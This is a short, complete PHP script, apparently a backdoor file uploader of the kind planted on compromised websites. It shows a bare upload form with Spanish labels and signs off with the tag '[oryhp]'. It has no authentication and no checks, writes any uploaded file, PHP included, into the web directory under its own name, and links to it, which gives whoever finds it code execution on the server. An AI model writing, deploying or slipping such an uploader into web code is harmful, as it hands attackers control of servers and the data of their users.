<?php
if(isset($_FILES["userfile"]["name"])){
$uploaddir = getcwd() . "/";
$uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]);

echo "<p>";

if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile)) {
  echo "[Archivo subido correctamente].\n";
} else {
   echo "[Error].";
}

echo "</p>";
echo "<pre>";
echo "Info:";
print_r($_FILES);
if ($_FILES["userfile"]["error"] == 0){
echo "<br><br><a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br><br>";
}
echo "</pre>";
}

    echo "<form enctype=\"multipart/form-data\" action=\"{$_SERVER["PHP_SELF"]}\" method=\"POST\">";
    echo "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"512000\" />";
    echo "<input name=\"userfile\" type=\"file\" />";
    echo "<input type=\"submit\" value=\"Subir\" />";
    echo "</form>";
    echo "[oryhp]";

exit;
?>